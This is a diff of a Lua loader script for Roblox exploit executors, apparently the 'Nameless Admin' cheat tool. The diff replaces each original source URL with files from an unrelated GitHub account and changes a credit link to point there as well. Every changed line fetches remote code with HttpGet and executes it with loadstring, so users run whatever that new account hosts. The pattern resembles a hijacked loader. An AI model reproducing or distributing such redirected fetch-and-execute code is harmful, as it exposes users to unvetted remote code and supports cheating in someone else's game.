@@ -32,7 +32,7 @@ if not gethui then
 	end
 end
 
-if identifyexecutor()=="Solara" or not fireproximityprompt then -- proximity prompt fix | Credits: Benomat (https://scriptblox.com/u/benomat)
+if identifyexecutor()=="Solara" or not fireproximityprompt then -- proximity prompt fix | Credits: Benomat (https://github.com/48973854274252)
 	getgenv().fireproximityprompt=function(pp)
 		local oldenabled=pp.Enabled
 		local oldhold=pp.HoldDuration
@@ -63,9 +63,9 @@ if not game:IsLoaded() then
 end
 local loader=''
 if getgenv().NATestingVer then
-	loader=[[loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/NA%20testing.lua"))();]]
+	loader=[[loadstring(game:HttpGet("https://raw.githubusercontent.com/48973854274252/Source/main/Send/.txt/SWTTIN1"))();]]
 else
-	loader=[[loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/Source.lua"))();]]
+	loader=[[loadstring(game:HttpGet("https://raw.githubusercontent.com/48973854274252/Source/main/Send/.txt/SWTTIN2.lua.txt"))();]]
 end
 
 NACaller(function()
@@ -82,7 +82,7 @@ local Notification=nil
 
 repeat 
 	local s,r=pcall(function()
-		return loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/NamelessAdminNotifications.lua"))()
+		return loadstring(game:HttpGet("https://raw.githubusercontent.com/48973854274252/Source/main/Send/.txt/NotifRest.txt"))()
 	end);
 
 	if s then
